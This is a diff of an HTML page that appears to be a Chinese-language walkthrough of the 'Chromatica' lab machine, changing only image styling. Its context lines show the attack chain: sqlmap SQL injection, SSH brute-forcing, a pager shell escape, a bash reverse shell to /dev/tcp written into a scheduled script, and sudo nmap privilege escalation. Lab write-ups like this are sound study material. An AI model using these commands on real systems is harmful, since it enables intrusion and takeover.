@@ -226,10 +226,10 @@ Finished
 ===============================================================
 </pre></div>
 <p><code class="notranslate">/robots.txt</code>看看有什么</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d2dc4a4f-abca-4887-91d1-22205caca415"><img src="https://github.com/user-attachments/assets/d2dc4a4f-abca-4887-91d1-22205caca415" alt="image" style="max-width: 100%; height: auto;"></a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/273a707d-7367-49f2-9b0a-04e9862dd39d"><img src="https://github.com/user-attachments/assets/273a707d-7367-49f2-9b0a-04e9862dd39d" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d2dc4a4f-abca-4887-91d1-22205caca415"><img src="https://github.com/user-attachments/assets/d2dc4a4f-abca-4887-91d1-22205caca415" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/273a707d-7367-49f2-9b0a-04e9862dd39d"><img src="https://github.com/user-attachments/assets/273a707d-7367-49f2-9b0a-04e9862dd39d" alt="image" style="max-width: 100%;"></a></p>
 <p>直接访问被拦截，加上用户代理<code class="notranslate">dev</code>我这使用的是<code class="notranslate">hackbar</code></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f59b082c-f36c-45b3-85c9-d1b41d36438d"><img src="https://github.com/user-attachments/assets/f59b082c-f36c-45b3-85c9-d1b41d36438d" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f59b082c-f36c-45b3-85c9-d1b41d36438d"><img src="https://github.com/user-attachments/assets/f59b082c-f36c-45b3-85c9-d1b41d36438d" alt="image" style="max-width: 100%;"></a></p>
 <p>访问成功，有输入框试试sql注入</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ sqlmap -u <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.215/dev-portal/<span class="pl-pds">'</span></span> --forms --batch --user-agent dev 
@@ -381,7 +381,7 @@ Session completed.
 f220c85e3ff19d043def2578888fb4e5
 aaf7fb4d4bffb8c8002978a9c9c6ddc9
 </pre></div>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6c3f0b6d-209e-4810-81e7-674c868ae20d"><img src="https://github.com/user-attachments/assets/6c3f0b6d-209e-4810-81e7-674c868ae20d" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6c3f0b6d-209e-4810-81e7-674c868ae20d"><img src="https://github.com/user-attachments/assets/6c3f0b6d-209e-4810-81e7-674c868ae20d" alt="image" style="max-width: 100%;"></a></p>
 <p>构建一下<code class="notranslate">user</code>和<code class="notranslate">pass</code>爆破ssh</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ cat tmp1<span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span>:<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $1}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> user
@@ -600,11 +600,11 @@ dev@192.168.205.215<span class="pl-s"><span class="pl-pds">'</span>s password: <
 <span class="pl-s">debug1：频道 0：设置环境语言 =“zh_CN.UTF-8”</span>
 <span class="pl-s">debug1：承诺：fork</span></pre></div>
 <p>创建了会话，不会了，去看了<code class="notranslate">HGBE</code>大佬的wp，原来是那个缩小提权的那个东西啊</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4f9018e3-67e2-498e-9dff-ea74a21c3134"><img src="https://github.com/user-attachments/assets/4f9018e3-67e2-498e-9dff-ea74a21c3134" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4f9018e3-67e2-498e-9dff-ea74a21c3134"><img src="https://github.com/user-attachments/assets/4f9018e3-67e2-498e-9dff-ea74a21c3134" alt="image" style="max-width: 100%;"></a></p>
 <p>输入<code class="notranslate">!/bin/bash</code>就可以放大了</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e49d4e3a-a938-4ab1-9637-0d0dd1aa7983"><img src="https://github.com/user-attachments/assets/e49d4e3a-a938-4ab1-9637-0d0dd1aa7983" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e49d4e3a-a938-4ab1-9637-0d0dd1aa7983"><img src="https://github.com/user-attachments/assets/e49d4e3a-a938-4ab1-9637-0d0dd1aa7983" alt="image" style="max-width: 100%;"></a></p>
 <p>他是这样实现的，可以学习一下</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/960705b3-aedc-493a-8c1b-0f751fe82604"><img src="https://github.com/user-attachments/assets/960705b3-aedc-493a-8c1b-0f751fe82604" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/960705b3-aedc-493a-8c1b-0f751fe82604"><img src="https://github.com/user-attachments/assets/960705b3-aedc-493a-8c1b-0f751fe82604" alt="image" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">dev@Chromatica:<span class="pl-k">~</span>$ ls -al
 total 72                                                                                                                             
 drwxr-x--- 7 dev  dev  4096 Apr 18  2024 <span class="pl-c1">.</span>                                                                                           
@@ -624,9 +624,9 @@ drwx------ 4 dev  dev  4096 Mar 27  2023 snap
 drwxr-xr-x 2 dev  dev  4096 Jun 19  2023 .vim                                                                                        
 -rw------- 1 dev  dev  9900 Apr 18  2024 .viminfo      </pre></div>
 <p><code class="notranslate">.bash_history</code>他没删除，我们直接看就好了</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/efa406ee-523b-40c5-9799-e4773c6ed1d2"><img src="https://github.com/user-attachments/assets/efa406ee-523b-40c5-9799-e4773c6ed1d2" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/efa406ee-523b-40c5-9799-e4773c6ed1d2"><img src="https://github.com/user-attachments/assets/efa406ee-523b-40c5-9799-e4773c6ed1d2" alt="image" style="max-width: 100%;"></a></p>
 <p>感兴趣</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d91a47c5-10cd-49d6-9e4e-94d4c4d09f56"><img src="https://github.com/user-attachments/assets/d91a47c5-10cd-49d6-9e4e-94d4c4d09f56" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d91a47c5-10cd-49d6-9e4e-94d4c4d09f56"><img src="https://github.com/user-attachments/assets/d91a47c5-10cd-49d6-9e4e-94d4c4d09f56" alt="image" style="max-width: 100%;"></a></p>
 <p>我们可以执行还是<code class="notranslate">analyst</code>用户的，我直接甩了一个反弹shell上去</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">dev@Chromatica:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1"<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /opt/scripts/end_of_day.sh
 dev@Chromatica:<span class="pl-k">~</span>$ cat /opt/scripts/end_of_day.sh
@@ -656,7 +656,7 @@ User analyst may run the following commands on Chromatica:
     (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /usr/bin/nmap
 </pre></div>
 <p>可以使用<code class="notranslate">sudo</code>权限执行nmap，打开<code class="notranslate">https://gtfobins.github.io/</code>搜一下就有了</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/90440358-1d07-47d8-ac52-8ed56ed63e60"><img src="https://github.com/user-attachments/assets/90440358-1d07-47d8-ac52-8ed56ed63e60" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/90440358-1d07-47d8-ac52-8ed56ed63e60"><img src="https://github.com/user-attachments/assets/90440358-1d07-47d8-ac52-8ed56ed63e60" alt="image" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">analyst@Chromatica:<span class="pl-k">~</span>$ TF=<span class="pl-s"><span class="pl-pds">$(</span>mktemp<span class="pl-pds">)</span></span>
 TF=<span class="pl-s"><span class="pl-pds">$(</span>mktemp<span class="pl-pds">)</span></span>
 analyst@Chromatica:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>os.execute("/bin/sh")<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> <span class="pl-smi">$TF</span>
